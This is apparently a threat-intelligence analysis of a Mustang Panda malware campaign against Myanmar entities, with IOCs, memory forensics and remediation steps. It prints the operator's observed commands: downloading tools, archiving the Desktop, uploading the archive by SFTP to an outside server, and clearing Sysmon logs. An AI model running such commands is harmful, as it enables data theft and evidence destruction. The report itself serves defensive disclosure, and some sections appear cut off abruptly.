## Executive Summary

This report details a targeted malware campaign attributed to Mustang Panda, a Chinese APT group, leveraging a supposed compromised Myanmar embassy email to deliver malware against Myanmar’s entities. The campaign begins with a phishing email containing a seemingly benign PDF attachment. While the PDF itself is not malicious, it contains an embedded URL that leads to the download of a compressed archive (`Call Notes.zip`). Inside the archive are two files:  `Call Notes.exe`  and  `SolidPDFCreator.dll`.

The  `Call Notes.exe`  binary employs multiple whitespace characters in its filename to obscure the  `.exe`  extension and is assigned a PDF icon, effectively masquerading as a legitimate document. Once executed, the malware sideloads  `SolidPDFCreator.dll`, establishes persistence via registry Run keys and executes additional payloads.

Subsequent activity includes system reconnaissance, collection of user data and exfiltration via SFTP to a remote server. The malware also exhibits defense evasion behaviors.

Evidence strongly suggests that Mustang Panda’s operations in this campaign align with broader Chinese state interests.

## Threat Landscape & Attribution

Mustang Panda (aka Bronze President, TA416) is a well-documented Chinese APT group known for targeting Southeast Asian governments, NGOs, and dissident groups. This campaign leverages Mustang Panda’s classic TTPs: DLL sideloading, use of cloud storage for staging, and data exfiltration using built-in tools. The use of a legitimate Myanmar embassy mailbox for phishing significantly increases the credibility of the attack, raising the possibility of strategic alignment with Myanmar’s government interests.

Picture 1: Attack Chain

The intrusion chain begins with a phishing email containing a seemingly benign PDF attachment. While the document itself is not malicious, it includes an embedded URL that hosts the malware payload. When the recipient clicks the link, a compressed archive (`Call Notes.zip`) is downloaded. Inside the archive are two components:  `Call Notes.exe`  and  `SolidPDFCreator.dll`.

The executable (`Call Notes.exe`) employs multiple whitespace characters in its filename to obscure the  `.exe`  extension and is assigned a PDF icon, effectively masquerading as a legitimate document to evade user suspicion.

### **DLL (SolidPDFCreator.dll) Findings**

-   **Exports (6):**  `ParseCommandLine`,  `SupportInfo`,  `AfsSetMainWnd`, and several decorated functions (`DeleteJob`,  `GetSPApp`, etc.).
-   **Imports:**  Standard Windows APIs, including  `KERNEL32.dll`,  `ADVAPI32.dll`, and  `USER32.dll`.
-   **Strings:**  Notable entries include  `Software\Microsoft\Windows\CurrentVersion\Run`  and the staging location  `C:\ProgramData\IDM\logs\`.
    -   **FLOSS:**  Reports some decoded strings along with several unknown strings.
-   **Code Injection / Self-Modification:**  The act of making a memory region both writable and executable is a potential indicator of malicious behavior. Malicious software such as exploit code, self-unpacking malware, or shellcode commonly uses  `VirtualProtect`  to alter memory permissions, inject code, and execute it. This is a well-established technique for runtime code injection.
-   **Keylogging:**  API imports and function usage suggest monitoring user input (e.g.,  `GetAsyncKeyState`,  `MapVirtualKeyExW`,  `GetKeyNameTextW`), consistent with a keylogging capability. This functionality would enable the malware to capture keystrokes for credential theft or surveillance.

The  `Call Notes.exe`  sample established an outbound HTTPS connection to the command-and-control (C2) server at 146[.]70[.]29[.]229. Due to encryption, the contents of the traffic could not be directly inspected. The connection persisted for several hours before the malware proceeded to execute additional commands, indicating a potential staging or beaconing phase prior to tasking.

During execution,  `Call Notes.exe`  spawns  `cmd.exe`  and issues a sequence of system and network commands. These actions reflect a structured workflow of tool staging, reconnaissance, collection, exfiltration, and anti-forensics.

**Executed Commands and Intentions:**

```
12:00:51 PM – curl
Invoked for network connectivity testing and/or tool retrieval.

12:01:06 PM – fsutil fsinfo drives
Enumerates logical drives on the system to identify available storage locations.

12:01:26 PM – arp -a
Displays the ARP cache to map local subnet hosts and potential lateral movement targets.

12:01:37 PM – curl -4 ifconfig.co/json
Queries an external service to obtain the system’s public IP address and geolocation data.

12:01:48 PM – ipconfig /all
Collects detailed local network configuration, including IPs, DNS servers, and MAC addresses.

12:02:52 PM – curl  -skL "hxxps[://]drive[.]usercontent[.]google[.]com/download?id=[redacted]&export=download&confirm=t&uuid=[redacted]" -o rar.exe
Downloads rar.exe from Google Drive, staging a compression utility for data collection.

12:03:24 PM – rar a -r heinn.rar C:\Users\heinn\Desktop\*
Archives the contents of the Desktop folder into a RAR archive (heinn.rar) for staging prior to exfiltration.

12:04:32 PM – curl  -u <username>:<password> -m 360 --connect-timeout 10 --retry 36 -s -k -C - -T heinn.rar sftp[://]202[.]59[.]10[.]106/pub/
Exfiltrates the archive to a remote SFTP server using hardcoded credentials.

12:05:02 PM – curl  -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0" --retry 3 -m 60 --connect-timeout 10 -s -k -L -o curl.exe "hxxps[://]drive[.]usercontent[.]google[.]com/download?id=[redacted]&export=download&confirm=t&uuid=[redacted]"
Retrieves an additional copy of curl.exe from Google Drive, likely as redundancy if the native version is unavailable.

12:05:12 PM – curl  -u <username>:<password> -m 360 --connect-timeout 10 --retry 36 -s -k -C - -T heinn.rar sftp[://]202[.]59[.]10[.]106/pub/
Reattempts data exfiltration, demonstrating persistence in ensuring successful transfer.

12:08:36 PM – wevtutil el
Enumerates available Windows event logs.

12:08:36 PM – findstr "sysmon"
Searches for Sysmon logs to identify enhanced monitoring tools in use.

12:09:10 PM – wevtutil cl "Microsoft-Windows-Sysmon/Operational"
Clears Sysmon logs to remove forensic traces of activity.

12:14:09 PM – tasklist /v
Lists all running processes with verbose details, likely for security software or analyst tool detection.

12:14:38 PM – net use
Enumerates mapped network drives, identifying accessible network resources.

12:14:42 PM – net share
Lists current file shares to assess available shared folders.

12:14:43 PM – net1 share
Redundant command to enumerate network shares, confirming available shared resources.

12:14:45 PM – shutdown -s -t 0
```

Following this command sequence, all files within the my machine’s shared folder were deleted, and the system was forcibly shut down. This behavior likely served one of two purposes:

1.  **Anti-forensics:**  Preventing analysts from recovering artifacts by memory forensics or file system review.
2.  **Analyst Disruption:**  Deliberately sabotaging the environment once the malware detected signs of analysis, thereby hindering further investigation.

During multiple executions of the malware, we observed significant variation in the command sets issued to the infected host. For example, in one run the malware executed reconnaissance commands such as  `fsutil fsinfo drives`,  `ipconfig /all`, and  `net share`, while in another execution additional anti-forensic commands such as  `wevtutil cl "Microsoft-Windows-Sysmon/Operational"`  were observed.

This inconsistency indicates that the malware is not operating from a fixed, pre-programmed script. Instead, it is receiving tasking dynamically from its command-and-control (C2) infrastructure at  `146[.]70[.]29[.]229:443`. The differences strongly suggest hands-on-keyboard operator involvement, a hallmark of advanced persistent threat (APT) tradecraft.

Such interactive C2 activity enables the attacker to:

-   Tailor reconnaissance commands based on the environment,
-   Deploy additional tools as needed (e.g., downloading  `rar.exe`  and  `curl.exe`  from Google Drive),
-   Execute data exfiltration selectively,
-   Perform anti-forensics by wiping event logs and, in one case, deleting files from shared folders and shutting down the system.

This level of operator engagement demonstrates that the intrusion campaign is active, targeted, and responsive, rather than an indiscriminate malware infection. It aligns with known Mustang Panda TTPs, where automated initial access is followed by interactive operator-driven actions to maximize impact and hinder analysis.

## Memory Forensics

A memory image was successfully captured after several controlled executions of the malware. Volatility and static inspection revealed multiple malicious artifacts, including DLL sideloading, synchronization primitives, and registry abuse. These findings provide clear evidence of persistence, execution control, and anti-forensic intent.

### DLL Sideloading

The primary loader (`Call Notes.exe`) sideloaded a malicious DLL (`SolidPDFCreator.dll`). This DLL was loaded into memory under the context of the dropped executable (`MediumInstStart.exe`), confirming the abuse of DLL search order hijacking for execution.

![](https://pyaeheinnkyaw.com/wp-content/uploads/2025/09/image-2-1024x234.png)

Picture 32: Memory Forensics (DLL Sideloading)

### Synchronization Objects

The malware created multiple synchronization objects during runtime, likely for execution control and preventing duplicate infections:

-   **Mutex:**  `WilStaging_02`
-   **Semaphore:**  `WilStaging_02_p0`
-   **Event:**  `ghdudfxctysvac`  (randomly generated)

Picture 35: Memory Forensics (Event)

### Registry-Based Persistence Attempt

Volatility’s  `handles`  plugin revealed that the malicious process (PID 5952) accessed multiple sensitive registry locations:

-   **`HKLM\SYSTEM\ControlSet001\Control\Session Manager`**
-   **`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`**
-   **`HKLM\SOFTWARE\Microsoft\OLE`**
-   **`HKU\S-1-5-21-302886374-4026673656-2035934985-1001\Software\Microsoft\Windows`**

The presence of the Image File Execution Options (IFEO) key is particularly notable. IFEO manipulation is a known technique for establishing stealth persistence by forcing legitimate executables to launch malicious payloads.

## Recommendations

Because this campaign involves an active operator controlling the C2 server, the malware’s behavior and artifacts may vary across executions. Cleanup should therefore follow a systematic, forensic-informed approach rather than relying on fixed file or registry paths. Recommended steps include:

1.  **Isolate the Host**
    -   Immediately disconnect the affected machine from the network to prevent further C2 communications and operator-driven actions.
2.  **Collect Evidence Before Cleanup**
    -   Acquire memory dumps, disk images, and relevant log files for forensic analysis. This preserves volatile evidence of the operator’s activity.
3.  **Remove Malicious Files and Directories**
    -   Delete suspicious executables and DLLs (e.g.,  `Call Notes.exe`,  `MediumInstStart.exe`,  `SolidPDFCreator.dll`) from directories such as  `C:\ProgramData\IDM\logs\`.
    -   Search for additional dropped files across  **user and public directories**, as operators may alter file locations.
4.  **Inspect and Clean Registry Keys**
    -   Review persistence mechanisms under:
        -   `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
        -   `HKCU\Software\Microsoft\Windows\CurrentVersion\RunNotification`
    -   Remove entries associated with  `MediumNetMonIt`  or similarly anomalous values.
5.  **Check for Scheduled Tasks and Services**  **(Optional)**
    -   Audit Task Scheduler for unknown or hidden tasks created by the malware.
    -   Inspect Windows services for modifications or newly added malicious services.
6.  **Verify System Integrity**
    -   Run  `sfc /scannow`  and/or third-party integrity tools to identify corrupted or replaced system files.
7.  **Perform Network and Account Remediation**
    -   Reset potentially compromised credentials.
    -   Block identified C2 infrastructure (e.g.,  `146[.]70[.]29[.]229`) at the firewall or proxy.
8.  **Rebuild if Necessary**
    -   If compromise is severe, consider a full system reimage to ensure complete removal and prevent hidden persistence.

    _Evidence:_  `GetAsyncKeyState`,  `GetKeyboardState`,  `ToUnicodeEx`,  `MapVirtualKey*`.
-   **Clipboard Data – T1115**  _(from static imports)_  
    _Evidence:_  `OpenClipboard`,  `GetClipboardData`/`SetClipboardData`,  `EmptyClipboard`,  `IsClipboardFormatAvailable`.
-   **Archive Collected Data – T1560.001 (Archive via Utility)**  
    _Evidence:_  `rar a -r <archive> C:\Users\…\Desktop\*`.

## Command and Control

-   **Web Protocols – T1071.001**  
    _Evidence:_  HTTPS traffic to  `146.70.29.229:443`  from the sideloaded chain.
-   **Ingress Tool Transfer – T1105**  
    _Evidence:_  `curl`  downloads  `rar.exe`  and  `curl.exe`  from Google Drive content delivery endpoints.
-   **Application Layer Protocol – T1071 (general)**  
    _Evidence:_  Use of standard HTTPS to blend into normal traffic.

## Exfiltration

    _Evidence:_  Operator deleted contents of a shared folder post-collection (as reported in observed run).
-   **System Shutdown/Reboot – T1529**  
    _Evidence:_  Host was shut down following exfiltration/cleanup, likely to disrupt live/volatile forensics.

## Conclusion

The analysis of  `Call Notes.exe`  and its associated components demonstrates that this malware is not designed for rapid financial gain or disruptive attacks, but rather for long-term surveillance and intelligence collection. Its use of DLL sideloading, registry-based persistence, in-memory code injection, and synchronization objects all point toward a stealthy design intended to evade detection.

The functionality uncovered includes keylogging, clipboard monitoring, reconnaissance commands, system enumeration, and data exfiltration via SFTP shows a clear focus on monitoring user activity and extracting sensitive information. Additionally, the operator-driven C2 behavior observed during dynamic analysis indicates an interactive threat actor tailoring actions to the target environment.

These characteristics are consistent with advanced persistent threat (APT) tradecraft. Attribution to Mustang Panda, coupled with targeting of Myanmar entities, underscores the likelihood that this malware is a state-aligned surveillance tool employed for espionage rather than common cybercrime.
